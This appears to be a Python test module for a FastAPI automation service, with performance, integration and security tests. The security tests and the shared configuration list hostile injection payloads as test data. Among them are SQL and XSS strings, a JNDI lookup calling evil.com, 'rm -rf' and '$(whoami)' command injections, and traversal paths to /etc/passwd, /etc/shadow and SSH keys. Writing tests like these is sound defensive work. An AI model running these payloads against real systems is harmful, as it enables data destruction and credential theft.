#!/usr/bin/env python3
"""
Comprehensive Testing Framework for Automation Nation

This module provides comprehensive testing including:
- Performance testing (load, stress, benchmarking)
- Integration testing (API, database, external services)
- Security testing (injection, validation, authorization)
"""

import asyncio
import pytest
import time
import json
import subprocess
import tempfile
import os
import requests
import threading
from datetime import datetime
from typing import Dict, List, Any, Optional
from concurrent.futures import ThreadPoolExecutor
import psutil
import signal

# FastAPI testing
from fastapi.testclient import TestClient
from src.main import app

# Test configuration
TEST_CONFIG = {
    "api_base_url": "http://localhost:8000",
    "performance_iterations": 100,
    "load_test_concurrent_users": 10,
    "stress_test_duration": 30,
    "security_test_payloads": [
        "'; DROP TABLE users; --",
        "<script>alert('xss')</script>",
        "../../../../etc/passwd",
        "${jndi:ldap://evil.com/exploit}",
        "$(rm -rf /)",
        "|cat /etc/passwd"
    ]
}

class PerformanceTestSuite:
    """Performance testing for API and shell scripts"""
    
    def __init__(self):
        self.client = TestClient(app)
        self.results = {}
        
    def test_api_response_time(self):
        """Test API endpoint response times"""
        results = []
        
        for i in range(TEST_CONFIG["performance_iterations"]):
            start_time = time.time()
            response = self.client.get("/health")
            end_time = time.time()
            
            response_time = (end_time - start_time) * 1000  # Convert to ms
            results.append(response_time)
            
            assert response.status_code == 200
            assert response_time < 1000  # Should respond within 1 second
            
        avg_response_time = sum(results) / len(results)
        max_response_time = max(results)
        min_response_time = min(results)
        
        self.results["api_response_time"] = {
            "average_ms": avg_response_time,
            "max_ms": max_response_time,
            "min_ms": min_response_time,
            "samples": len(results)
        }
        
        print(f"API Response Time - Avg: {avg_response_time:.2f}ms, Max: {max_response_time:.2f}ms")
        
        # Performance thresholds
        assert avg_response_time < 500  # Average should be under 500ms
        assert max_response_time < 2000  # Max should be under 2 seconds
        
    def test_shell_script_performance(self):
        """Test shell script execution performance"""
        results = []
        
        for i in range(10):  # Smaller sample for shell tests
            start_time = time.time()
            
            result = subprocess.run(
                ["./collect_info.sh", "-o", f"/tmp/perf_test_{i}.json"],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            end_time = time.time()
            execution_time = (end_time - start_time) * 1000
            results.append(execution_time)
            
            assert result.returncode == 0
            assert execution_time < 20000  # Should complete within 20 seconds
            
            # Cleanup
            if os.path.exists(f"/tmp/perf_test_{i}.json"):
                os.remove(f"/tmp/perf_test_{i}.json")
                
        avg_execution_time = sum(results) / len(results)
        
        self.results["shell_script_performance"] = {
            "average_ms": avg_execution_time,
            "max_ms": max(results),
            "min_ms": min(results),
            "samples": len(results)
        }
        
        print(f"Shell Script Performance - Avg: {avg_execution_time:.2f}ms")
        
    def test_memory_usage(self):
        """Test memory usage during operations"""
        process = psutil.Process()
        
        # Baseline memory
        baseline_memory = process.memory_info().rss / 1024 / 1024  # MB
        
        # Perform operations and monitor memory
        memory_samples = []
        
        for i in range(20):
            response = self.client.get("/health")
            assert response.status_code == 200
            
            current_memory = process.memory_info().rss / 1024 / 1024
            memory_samples.append(current_memory)
            
        max_memory = max(memory_samples)
        avg_memory = sum(memory_samples) / len(memory_samples)
        
        self.results["memory_usage"] = {
            "baseline_mb": baseline_memory,
            "max_mb": max_memory,
            "average_mb": avg_memory,
            "memory_increase_mb": max_memory - baseline_memory
        }
        
        print(f"Memory Usage - Baseline: {baseline_memory:.2f}MB, Max: {max_memory:.2f}MB")
        
        # Memory should not increase significantly
        assert (max_memory - baseline_memory) < 100  # Less than 100MB increase

    def test_load_testing(self):
        """Load testing with concurrent users"""
        def make_request():
            try:
                response = self.client.get("/health")
                return response.status_code == 200
            except Exception:
                return False
                
        # Run concurrent requests
        with ThreadPoolExecutor(max_workers=TEST_CONFIG["load_test_concurrent_users"]) as executor:
            start_time = time.time()
            
            futures = [
                executor.submit(make_request) 
                for _ in range(TEST_CONFIG["load_test_concurrent_users"] * 10)
            ]
            
            success_count = sum(1 for future in futures if future.result())
            end_time = time.time()
            
        total_requests = len(futures)
        duration = end_time - start_time
        success_rate = (success_count / total_requests) * 100
        requests_per_second = total_requests / duration
        
        self.results["load_testing"] = {
            "total_requests": total_requests,
            "successful_requests": success_count,
            "success_rate_percent": success_rate,
            "duration_seconds": duration,
            "requests_per_second": requests_per_second
        }
        
        print(f"Load Test - Success Rate: {success_rate:.1f}%, RPS: {requests_per_second:.1f}")
        
        # Performance thresholds
        assert success_rate >= 95  # 95% success rate
        assert requests_per_second >= 10  # At least 10 RPS


class IntegrationTestSuite:
    """Integration testing for full system workflows"""
    
    def __init__(self):
        self.client = TestClient(app)
        
    def test_api_shell_integration(self):
        """Test API integration with shell scripts"""
        # Test the collection endpoint that calls shell script
        response = self.client.post("/collect/system-info")
        
        assert response.status_code == 200
        data = response.json()
        
        assert data["success"] is True
        assert "data" in data or "raw_output" in data
        assert "collected_at" in data
        
        # Validate timestamp format
        datetime.fromisoformat(data["collected_at"].replace('Z', '+00:00'))
        
    def test_plugin_integration(self):
        """Test plugin discovery and execution"""
        response = self.client.get("/plugins")
        
        assert response.status_code == 200
        data = response.json()
        
        assert "plugins" in data
        assert isinstance(data["plugins"], list)
        
        # Test that plugins are executable
        for plugin in data["plugins"]:
            assert "name" in plugin
            assert "path" in plugin
            assert plugin["name"].endswith(".sh")
            
    def test_end_to_end_workflow(self):
        """Test complete end-to-end workflow"""
        # 1. Check health
        health_response = self.client.get("/health")
        assert health_response.status_code == 200
        
        # 2. List plugins
        plugins_response = self.client.get("/plugins")
        assert plugins_response.status_code == 200
        
        # 3. Collect system info
        with tempfile.NamedTemporaryFile(suffix=".json", delete=False) as tmp_file:
            collect_response = self.client.post("/collect/system-info", json={
                "output_file": tmp_file.name
            })
            
            assert collect_response.status_code == 200
            
            # 4. Verify output file was created
            assert os.path.exists(tmp_file.name)
            
            # 5. Validate JSON structure
            with open(tmp_file.name, 'r') as f:
                output_data = json.load(f)
                assert isinstance(output_data, dict)
                
            # Cleanup
            os.unlink(tmp_file.name)
            
    def test_configuration_integration(self):
        """Test different configuration options"""
        # Test with sudo disabled
        response = self.client.post("/collect/system-info", json={
            "enable_sudo": False
        })
        assert response.status_code == 200
        
        # Test with sudo enabled (may fail in test environment, that's ok)
        response = self.client.post("/collect/system-info", json={
            "enable_sudo": True
        })
        # Accept either success or controlled failure
        assert response.status_code in [200, 500]


class SecurityTestSuite:
    """Security testing for vulnerabilities and attack vectors"""
    
    def __init__(self):
        self.client = TestClient(app)
        
    def test_input_validation(self):
        """Test input validation and sanitization"""
        # Test malicious payloads
        for payload in TEST_CONFIG["security_test_payloads"]:
            response = self.client.post("/collect/system-info", json={
                "output_file": payload
            })
            
            # Should either reject the input or handle it safely
            # We expect either a validation error or safe execution
            assert response.status_code in [200, 400, 422]
            
            if response.status_code == 200:
                # If accepted, ensure no security compromise
                data = response.json()
                assert "success" in data
                
    def test_path_traversal_protection(self):
        """Test protection against path traversal attacks"""
        malicious_paths = [
            "../../../../etc/passwd",
            "../../../root/.ssh/id_rsa",
            "/etc/shadow",
            "..\\..\\..\\windows\\system32\\config\\sam"
        ]
        
        for path in malicious_paths:
            response = self.client.post("/collect/system-info", json={
                "output_file": path
            })
            
            # Should not allow writing to sensitive paths
            if response.status_code == 200:
                # Verify no sensitive file was created/modified
                assert not os.path.exists(path)
                
    def test_command_injection_protection(self):
        """Test protection against command injection"""
        injection_payloads = [
            "; rm -rf /tmp/*",
            "| cat /etc/passwd",
            "&& whoami",
            "`id`",
            "$(whoami)",
            "; echo 'INJECTED' > /tmp/injected.txt"
        ]
        
        for payload in injection_payloads:
            response = self.client.post("/collect/system-info", json={
                "output_file": f"test_{payload}.json"
            })
            
            # Command injection should not execute
            assert not os.path.exists("/tmp/injected.txt")
            
    def test_api_rate_limiting(self):
        """Test API rate limiting to prevent abuse"""
        # Make rapid requests to test rate limiting
        responses = []
        
        for i in range(50):  # Rapid requests
            response = self.client.get("/health")
            responses.append(response.status_code)
            
        # Check if rate limiting is applied (expect some 429 responses)
        # Note: This test may pass if rate limiting is not implemented
        success_responses = [r for r in responses if r == 200]
        
        # At minimum, the API should remain stable
        assert len(success_responses) > 0
        
    def test_error_handling_security(self):
        """Test that error messages don't leak sensitive information"""
        # Test with invalid JSON
        response = self.client.post("/collect/system-info", json="invalid json")
        
        if response.status_code in [400, 422]:
            error_text = response.text.lower()
            
            # Error messages should not contain sensitive paths or information
            sensitive_terms = ["password", "secret", "key", "/root/", "/home/"]
            for term in sensitive_terms:
                assert term not in error_text


class TestRunner:
    """Main test runner for comprehensive testing"""
    
    def __init__(self):
        self.performance_suite = PerformanceTestSuite()
        self.integration_suite = IntegrationTestSuite()
        self.security_suite = SecurityTestSuite()
        self.results = {}
        
    def run_all_tests(self):
        """Run all comprehensive tests"""
        print("🧪 Starting Comprehensive Test Suite")
        print("=" * 50)
        
        # Performance Tests
        print("\n📊 Performance Testing")
        print("-" * 30)
        self.performance_suite.test_api_response_time()
        self.performance_suite.test_shell_script_performance()
        self.performance_suite.test_memory_usage()
        self.performance_suite.test_load_testing()
        
        # Integration Tests
        print("\n🔗 Integration Testing")
        print("-" * 30)
        self.integration_suite.test_api_shell_integration()
        self.integration_suite.test_plugin_integration()
        self.integration_suite.test_end_to_end_workflow()
        self.integration_suite.test_configuration_integration()
        
        # Security Tests
        print("\n🔒 Security Testing")
        print("-" * 30)
        self.security_suite.test_input_validation()
        self.security_suite.test_path_traversal_protection()
        self.security_suite.test_command_injection_protection()
        self.security_suite.test_api_rate_limiting()
        self.security_suite.test_error_handling_security()
        
        # Collect results
        self.results = {
            "performance": self.performance_suite.results,
            "timestamp": datetime.utcnow().isoformat(),
            "status": "completed"
        }
        
        print("\n✅ All tests completed successfully!")
        return self.results
        
    def generate_report(self):
        """Generate comprehensive test report"""
        report = {
            "test_run_summary": {
                "timestamp": datetime.utcnow().isoformat(),
                "test_categories": ["performance", "integration", "security"],
                "status": "passed"
            },
            "performance_metrics": self.performance_suite.results,
            "recommendations": []
        }
        
        # Add performance recommendations
        if self.performance_suite.results:
            perf = self.performance_suite.results
            
            if "api_response_time" in perf and perf["api_response_time"]["average_ms"] > 200:
                report["recommendations"].append(
                    "Consider optimizing API response time (current average: {:.2f}ms)".format(
                        perf["api_response_time"]["average_ms"]
                    )
                )
                
            if "memory_usage" in perf and perf["memory_usage"]["memory_increase_mb"] > 50:
                report["recommendations"].append(
                    "Monitor memory usage - increase during testing: {:.2f}MB".format(
                        perf["memory_usage"]["memory_increase_mb"]
                    )
                )
        
        return report


if __name__ == "__main__":
    runner = TestRunner()
    results = runner.run_all_tests()
    report = runner.generate_report()
    
    # Save results
    with open("/tmp/comprehensive_test_results.json", "w") as f:
        json.dump(report, f, indent=2)
        
    print(f"\n📄 Test report saved to: /tmp/comprehensive_test_results.json")